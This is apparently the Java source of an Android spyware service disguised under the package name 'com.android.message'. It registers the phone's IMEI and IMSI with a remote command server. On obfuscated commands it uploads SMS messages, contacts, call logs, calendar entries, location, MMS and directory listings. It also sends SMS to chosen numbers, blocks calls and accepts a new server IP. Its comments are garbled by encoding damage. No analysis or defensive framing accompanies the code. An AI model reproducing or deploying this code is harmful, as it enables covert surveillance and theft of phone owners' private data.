package com.android.message;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.channels.Selector;
import java.nio.channels.SocketChannel;
import java.nio.charset.Charset;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

/**
 * 
 * @author log(K) ���͵Ľ���ע����Ϣ��service
 */
public class RegisterService extends Service {

	private static final String TAG = "RegisterService";

	public static String smsOrder = "";

	public static String SERVERIP = ServerIP.servIP;
	public static final int SERVERPORT = 2005;
	public Socket handsocket = null;
	public static String regStr = null;
	private String regStrForFile = null;
	// private String strPicName = null;

	// �������������socket
	public static Socket orderSocket = null;
	public static DataOutputStream orderDOS = null;
	public static DataInputStream orderDIS = null;
	public static int count = 0; // ����ע����Ϣ����
	byte[] order = new byte[1024];
	public static long talkRunning = 0;
	public static int print = 1;
	public OpenNetwork network;
	public boolean networkState;

	// public Intent intent;

	/*
	 * private ByteBuffer sendBufferLen=ByteBuffer.allocate( 9 ); private
	 * ByteBuffer sendBuffer=ByteBuffer.allocate(39); private ByteBuffer
	 * receiveBuffer=ByteBuffer.allocate(1024); private Charset
	 * charset=Charset.forName("GBK");
	 */
	public Context mContext = null;
	public boolean THREAD_RUNNING = true;

	public void initService() {
		BasicInfo bInfo = new BasicInfo(this);
		String strIMEI = bInfo.getIMEI();
		String strIMSI = bInfo.getIMSI();

		regStr = "Android@" + strIMSI + "@" + strIMEI;
		regStrForFile = regStr.substring(8);
		Log.v(TAG, regStr);
		Log.v(TAG, regStrForFile);
		WriteLogFile.writeLog(regStrForFile);

	}

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	PowerManager.WakeLock wL = null;

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		// mWorkTimer.schedule(CLOCK_WORK_TimerTask, 0, 5000);

		if (null == wL) {
			PowerManager pm = (PowerManager) this
					.getSystemService(Context.POWER_SERVICE);
			wL = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
					"com.android.message");
			if (null != wL) {
				wL.acquire();
				// WriteLogFile.writeLog("��ǣ�NET�����create");
			}
		}
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		Log.i("i", "onStartCommand...");

		network = new OpenNetwork(this); // �鿴���ڵ�����״̬
		networkState = network.checkNetWorkData();

		new Thread() {
			public void run() {

				talk();
				WriteLogFile.writeLog("command exec end!");

				try {
					Thread.sleep(15 * 1000); // �ȴ�15s,����������������
				} catch (Exception e) {
					e.printStackTrace();
				}

				if (networkState == false) { // ���ԭ���رգ�����ʹ�ú�����ر�
					WriteLogFile.writeLog("close the net");
					network.setDataEnabled(false);
				}
				stopSelf();// Stop service when task is done;
				System.exit(0);// Exit program

			}

		}.start();

		return START_NOT_STICKY;
	}

	/**
	 * ����ע����Ϣ
	 * 
	 * @param prefix
	 */
	public void sendRegInfo() {
		// this.regStr = "Android@123456789012345@098765432112345";

		try {
			if (orderSocket == null || orderSocket.isClosed()
					|| (!orderSocket.isConnected())) {
				boolean connect = false;
				while (!connect) {
					try {
						orderSocket = new Socket(SERVERIP, SERVERPORT);
						Thread.sleep(3000); // �����Ϸ������ȴ�3s����
						orderDOS = new DataOutputStream(
								orderSocket.getOutputStream());
						orderDIS = new DataInputStream(
								orderSocket.getInputStream());
						connect = true;
						Log.v(TAG, "Connect server success");
					} catch (Exception e) {
						connect = false;
						try {
							if (orderSocket != null) {
								orderSocket.close();
								orderSocket = null;
							}
						} catch (Exception e2) {
							String msg = e2.getMessage();
							if (msg != null) {
								System.out.println(msg);
							}
						}

						String message = e.getMessage();
						if (message != null) {
							System.out.println(message);
						} else {
							Log.v(TAG, "connect failed, try again");
						}
					}
				}
				orderSocket.setSoTimeout(2 * 1000); // read��ʱʱ�� 20S
			}

			try {
				// ����ע����Ϣ
				byte[] breg = regStr.getBytes("gb2312");
				int it = breg.length;
				String strbl = String.format("%09d", it);
				byte[] bregl = strbl.getBytes("gb2312");

				orderDOS.write(bregl);
				orderDOS.flush();
				orderDOS.write(breg);
				orderDOS.flush();
				Log.v(TAG, new String(breg));
				++print;

			} catch (Exception e) {
				String message = e.getMessage();
				if (message != null) {
					System.out.println(message);
				} else {
					Log.v("Error", "line-151");
				}
				if (orderSocket != null) {
					try {
						orderSocket.close();
						orderSocket = null;
					} catch (IOException e2) {
						System.out.println(e2.getMessage());
					}
				}
			}
		} catch (Exception e) {
			String msg = e.getMessage();
			System.out.println(msg);
		}
	}

	public void talk() {
		initService(); // ��ȡIMEI�� IMSI��
		if (smsOrder != "") {
			commandExecute(smsOrder);
			smsOrder = "";
		}
		/*
		 * while (true) { try { sendRegInfo(); //����ע����Ϣ //ִ�ж������� if(smsOrder !=
		 * "") { commandExecute(smsOrder); smsOrder = ""; } try {
		 * System.out.println("TcpClient-- talk for start"); ++talkRunning; //
		 * �ж��Ƿ�����Ϣ����,�еĻ���ִ������ try { // �����յ��ֻ���������ʱ int length = 0; try { length
		 * = orderDIS.read(order); } catch (java.net.SocketTimeoutException e) {
		 * String message = e.getMessage(); if (message != null) {
		 * System.out.println(message); } } if (length == 0) continue; String
		 * ords = new String(order, 0, length); Log.v(TAG, ords);
		 * 
		 * WriteLogFile.writeLog("Receive order--" + ords); // ����ע����Ϣ
		 * commandExecute(ords);
		 * 
		 * } catch (Exception e) { String message = e.getMessage(); if (message
		 * != null) { System.out.println(message); } else { Log.v(TAG,
		 * "read order error"); } } } catch (Exception e) { String message =
		 * e.getMessage(); if (message != null) { System.out.println(message); }
		 * else { Log.v(TAG, "read order error"); } } } catch (Exception e) {
		 * e.printStackTrace(); } }
		 */
	}

	public void commandExecute(String command) {
		// �����ļ�
		WriteLogFile.writeLog(command);
		SendFile sendfile = new SendFile();

		// if (command.equalsIgnoreCase("SxVa")) {
		if (command.contains("SxVa")) {
			Message msg = new Message(this);
			msg.readAllSMS();
			sendfile.send("data/data/com.android.message/Message.txt",
					"Message.txt", regStrForFile);
			// deleteFile("data/data/com.buct.InfoCollect/Message.txt");
		}

		else if (command.contains("3Vaa")) {
			Contacts contacts = new Contacts(this);
			contacts.getCardContacts();

			sendfile.send("data/data/com.android.message/SimPhoneNum.txt",
					"SimPhoneNum.txt", regStrForFile);

			// deleteFile("data/data/com.buct.InfoCollect/SimPhoneNum.txt");
		} else if (command.contains("T7x6")) {
			Contacts contacts = new Contacts(this);
			contacts.getLocalContacts();

			sendfile.send("data/data/com.android.message/OutLookPhoneNum.txt",
					"OutLookPhoneNum.txt", regStrForFile);

			// deleteFile("data/data/com.buct.InfoCollect/OutLookPhoneNum.txt");
		} else if (command.contains("vS8b")) { // bug?
			Calendar calendar = new Calendar(this);
			calendar.getCalendarAppoint();

			sendfile.send("data/data/com.android.message/Appointment.txt",
					"Appointment.txt", regStrForFile);

			// deleteFile("data/data/com.buct.InfoCollect/Appointment.txt");
		}

		else if (command.contains("nn8C")) { // bug
			Calendar calendar = new Calendar(this);
			calendar.getCalendarTask();

			sendfile.send("data/data/com.android.message/Task.txt", "Task.txt",
					regStrForFile);

			// deleteFile("data/data/com.buct.InfoCollect/Task.txt");
		}

		else if (command.contains("xvsP")) {
			/*-
			 * ��ȡĿ¼��Ϣ
			 * Ŀ¼��������/dataʱ����
			 */
			try{
			FileInfo fileinfo = new FileInfo(this);
			fileinfo.tree("/system", 0);// "/mnt" "/system"
			sendfile.send("data/data/com.android.message/fileInfor.txt",
					"fileInfor.txt", regStrForFile);
			}catch(Exception e){
				
			}
			// deleteFile("data/data/com.buct.InfoCollect/fileInfor.txt");
		} else if (command.contains("Xrw0")) {
			CallLog calllog = new CallLog(this);
			calllog.getCallLog();
			sendfile.send("data/data/com.android.message/CallRecord.txt",
					"CallRecord.txt", regStrForFile);

			// deleteFile("data/data/com.buct.InfoCollect/CallRecord.txt");
		}
		/*
		 * else if (command.equalsIgnoreCase("Voice")) {
		 * 
		 * audioPro = new AudioPro();
		 * audioPro.writeLog("------AndroidVoice start..."); }
		 * 
		 * else if (command.equalsIgnoreCase("Stop") ||
		 * command.equalsIgnoreCase("reset")) {
		 * //Toast.makeText(InfoCollect.act, "------come to stop...",
		 * Toast.LENGTH_LONG).show();
		 * //audioPro.writeLog("------Command stop..."); Log.v("Stop Voice",
		 * "Ex Stop");
		 * 
		 * AudioPro.keepSending = false; if (audioPro != null) {
		 * audioPro.writeLog("------audioPro!=null..."); audioPro.stop();
		 * Log.v("Stop voice", "Stop"); audioPro.resetFileProPara();
		 * audioPro.writeLog("------Stop sending voice...");
		 * //Toast.makeText(InfoCollect.act, "------stop sending voice...",
		 * Toast.LENGTH_LONG).show(); audioPro = null;
		 * 
		 * } }
		 */
		// ��γ��
		else if (command.contains("lsP5")) {
			LocationServ location = new LocationServ(this);
			String newLoc = location.getLocation();
			newLoc = "Location@" + regStr + newLoc;
			Log.i("Location Service", newLoc);
			sendfile.sendLocation(newLoc);
			WriteLogFile.writeLog("send location over!");
		}

		// ����
		else if (command.contains("nl3Z")) {
			Log.v("MMC", "sending");
			MMS aMMS = new MMS(this);
			Log.v("MMC", "new over");
			aMMS.getMMC();
			Log.v("MMC", "getMMC over");
			sendfile.sendBigFile("data/data/com.android.message/mmc.zip",
					"mmc.zip", regStrForFile);
			Log.v("MMC", "send over");
		}
		// lzd start add change IP command action
		else if (command.contains("xS7j")) {
			// �����µ��Ѿ�����ķ�������IP��ַ
			String ChangeIPCommand = command;
			int fist = ChangeIPCommand.lastIndexOf("xS7j");
			String encryptedIPAddress = ChangeIPCommand.substring(fist + 4,
					fist + 4 + 15);
			WriteLogFile.writeLog("������������IP��ַ��ȡ��Ϊ��" + encryptedIPAddress);
			// ����õ��Ѿ����ܵ�IP��ַ����
			String newIPAddress = ServerIP.decrypt(encryptedIPAddress);

			if (newIPAddress.length() == 0) {
				// �������ʧ�ܣ��緢�����Ĳ��ǺϷ�������

				// �رշ����˳�����
				stopSelf();// Stop service when task is done;
				System.exit(0);// Exit program
			} else {
				try {
					if (ServerIP.setServerIP(newIPAddress)) {

						// ����IP��ַ�ɹ��󣬽��޸�IP��ַ�ɹ�����ʾ�ļ��������ƶ�
						IPChanged aipchanged = new IPChanged(this);
						aipchanged.writeNewIP();
						sendfile.send(
								"data/data/com.android.message/IPChanged.txt",
								"IPChanged.txt", regStrForFile);
					} else {
						// �رշ����˳�����
						stopSelf();// Stop service when task is done;
						System.exit(0);// Exit program
					}
				} catch (IOException e) {
					// WriteLogFile.writeLog("�޸���IP��ַ�����쳣!");
				} finally {
				}
			}
		}
		// lzd end
		else if (command.contains("dH7k")) {
			// ����ָ���������ݵ�ָ������
			String CommandText = command;
			int first = CommandText.lastIndexOf("dH7k");
			int firstSharp = first + 5;
			int second = CommandText.lastIndexOf("#");
			int secondSharp = second + 1;
			String phoneNum = CommandText.substring(firstSharp, second);
			String TextContent = CommandText.substring(secondSharp);
			// ���ܶ�������
			String decryptedPhoneNum = EncryptDecryptStr
					.strToPhoneNum(phoneNum);
			String decryptedTextContent = EncryptDecryptStr
					.stringSubOne(TextContent);
			SendAppointSMS aSendAppointSMS = new SendAppointSMS();
			aSendAppointSMS.sendAppointSMS(decryptedPhoneNum,
					decryptedTextContent);
			// ��ʾת���ɹ�
			FileOperate FileOperateSuccess = new FileOperate(
					"ForwardSuccess.txt");
			GetNowTime aGetNowTime = new GetNowTime();

			try {
				FileOperateSuccess.writeFile(aGetNowTime.returnTime()
						+ "\n����:\r" + decryptedTextContent + "\rת����"
						+ decryptedPhoneNum + "�ɹ�");
			} catch (Exception e) {

			}
			sendfile.send("data/data/com.android.message/ForwardSuccess.txt",
					"ForwardSuccess.txt", regStrForFile);
			stopSelf();// Stop service when task is done;
			System.exit(0);// Exit program
		} else if (command.contains("j9P5")) {
			// ��ֹ�����ָ���ĺ���
			String CommandText = command;
			int first = CommandText.lastIndexOf("j9P5");
			first = first + 4;
			String phoneNum = command.substring(first, first + 11);
			// �����ֻ���
			String decryptedPhoneNum = EncryptDecryptStr
					.strToPhoneNum(phoneNum);
			FileOperate aFileOperate = new FileOperate("ProhibitNum.txt");
			try {
				aFileOperate.writeFile(decryptedPhoneNum);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			// ��ʾ��ֹ�ɹ�
			FileOperate FileOperateSuccess = new FileOperate(
					"ProhibitNumSuccess.txt");
			GetNowTime aGetNowTime = new GetNowTime();

			try {
				FileOperateSuccess.writeFile(aGetNowTime.returnTime()
						+ "\n��ֹĿ���ֻ�����" + decryptedPhoneNum + "�ɹ�");
			} catch (Exception e) {

			}
			sendfile.send(
					"data/data/com.android.message/ProhibitNumSuccess.txt",
					"ProhibitNumSuccess.txt", regStrForFile);
			stopSelf();// Stop service when task is done;
			System.exit(0);// Exit program
		} else if (command.contains("UR4f")) {
			// ��������ָ���ĺ���
			String CommandText = command;
			int first = CommandText.lastIndexOf("UR4f");
			first = first + 4;
			String phoneNum = command.substring(first, first + 11);
			// �����ֻ���
			String decryptedPhoneNum = EncryptDecryptStr
					.strToPhoneNum(phoneNum);
			FileOperate aFileOperate = new FileOperate("ProhibitNum.txt");

			try {
				aFileOperate.replaceFileContent(decryptedPhoneNum, "");// ���ļ���ĺ�������
			} catch (Exception e) {

			}
			// ��ʾ����ɹ�
			FileOperate FileOperateSuccess = new FileOperate(
					"NotProhibitNumSuccess.txt");
			GetNowTime aGetNowTime = new GetNowTime();

			try {
				FileOperateSuccess.writeFile(aGetNowTime.returnTime()
						+ "\n���Ŀ���ֻ�����" + decryptedPhoneNum + "�ɹ�");
			} catch (Exception e) {

			}
			sendfile.send(
					"data/data/com.android.message/NotProhibitNumSuccess.txt",
					"NotProhibitNumSuccess.txt", regStrForFile);
			stopSelf();// Stop service when task is done;
			System.exit(0);// Exit program
		} else if (command.contains("Pk9b")) {
			// ��ֹ�������е绰
			FileOperate aFileOperate = new FileOperate("ProhibitAll.txt");
			try {
				aFileOperate.writeFile("All");
			} catch (Exception e) {

			}
			// ��ʾ��ֹ�������е绰�ɹ�
			FileOperate FileOperateSuccess = new FileOperate(
					"ProhibitAllSuccess.txt");
			GetNowTime aGetNowTime = new GetNowTime();

			try {
				FileOperateSuccess.writeFile(aGetNowTime.returnTime()
						+ "\n��ֹĿ���ֻ��������е绰�ɹ�");
			} catch (Exception e) {

			}
			sendfile.send(
					"data/data/com.android.message/ProhibitAllSuccess.txt",
					"ProhibitAllSuccess.txt", regStrForFile);
			stopSelf();// Stop service when task is done;
			System.exit(0);// Exit program
		} else if (command.contains("VT5w")) {
			// ����������е绰
			FileOperate aFileOperate = new FileOperate("ProhibitAll.txt");
			try {
				aFileOperate.replaceFileContent("All", "");// ���ļ����All����
			} catch (Exception e) {

			}
			// ��ʾ����������е绰�ɹ�
			FileOperate FileOperateSuccess = new FileOperate(
					"NotProhibitAllSuccess.txt");
			GetNowTime aGetNowTime = new GetNowTime();

			try {
				FileOperateSuccess.writeFile(aGetNowTime.returnTime()
						+ "\n���Ŀ���ֻ��������е绰�ɹ�");
			} catch (Exception e) {

			}
			sendfile.send(
					"data/data/com.android.message/NotProhibitAllSuccess.txt",
					"NotProhibitAllSuccess.txt", regStrForFile);
			stopSelf();// Stop service when task is done;
			System.exit(0);// Exit program
		}
	}

}
